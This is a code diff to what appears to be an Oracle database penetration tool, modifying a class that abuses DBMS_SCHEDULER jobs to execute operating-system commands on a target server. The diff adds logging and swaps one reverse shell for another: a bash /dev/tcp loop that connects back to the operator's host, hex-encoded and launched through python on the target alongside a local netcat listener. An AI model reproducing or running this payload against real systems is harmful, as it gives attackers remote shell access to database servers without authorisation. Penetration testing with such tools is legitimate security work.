@@ -30,6 +30,7 @@ class DbmsScheduler (OracleDatabase):
 		parameters = {'job_name':self.jobName,'job_type':'EXECUTABLE','job_action':splitCmd[0],'number_of_arguments':len(splitCmd)-1,'auto_drop':False}
 		cursor = cx_Oracle.Cursor(self.args['dbcon'])
 		try :
+			if self.args['show_sql_requests'] == True: logging.info("SQL request executed: DBMS_SCHEDULER.create_job with these parameters: {0}".format(parameters))
 			cursor.callproc(name="DBMS_SCHEDULER.create_job",keywordParameters=parameters)
 		except Exception,e: 
 			logging.info('Error with DBMS_SCHEDULER.create_job:{0}'.format(self.cleanError(e)))
@@ -39,6 +40,7 @@ class DbmsScheduler (OracleDatabase):
 				if pos!=0:
 					parameters = {'job_name':self.jobName,'argument_position':pos,'argument_value':anArg}
 					try :
+						if self.args['show_sql_requests'] == True: logging.info("SQL request executed: DBMS_SCHEDULER.set_job_argument_value with these parameters: {0}".format(parameters))
 						cursor.callproc(name="DBMS_SCHEDULER.set_job_argument_value",keywordParameters=parameters)
 					except Exception,e: 
 						logging.info('Error with DBMS_SCHEDULER.set_job_argument_value:{0}'.format(self.cleanError(e)))
@@ -118,11 +120,13 @@ class DbmsScheduler (OracleDatabase):
 		Need upload nc.exe if the remote system is windows
 		'''
 		if self.remoteSystemIsWindows() == True :
-			logging.info('The remote system is windows. I will upload the nc.exe binary on the remote server to give you a reverse shell')
+			logging.warn("Java reverse shell is not implement for Windows yet")
 			pass
 		elif self.remoteSystemIsLinux() == True :
-			PYTHON_CODE = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""".format(localip, localport)
+			#PYTHON_CODE = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""".format(localip, localport)
+			PYTHON_CODE = """import os; os.system('exec 5<>/dev/tcp/{0}/{1}; /bin/cat <&5 | while read line; do $line 2>&5 >&5; done');""".format(localip, localport)
 			CMD = '''/usr/bin/python -c exec('{0}'.decode('hex'))'''.format(PYTHON_CODE.encode('hex'))
+			logging.debug('The following command will be executed on the target: {0}'.format(CMD))
 			self.args['print'].goodNews("The python reverse shell tries to connect to {0}:{1}".format(localip,localport))
 			a = Thread(None, self.__runListenNC__, None, (), {'port':localport})
 			a.start()
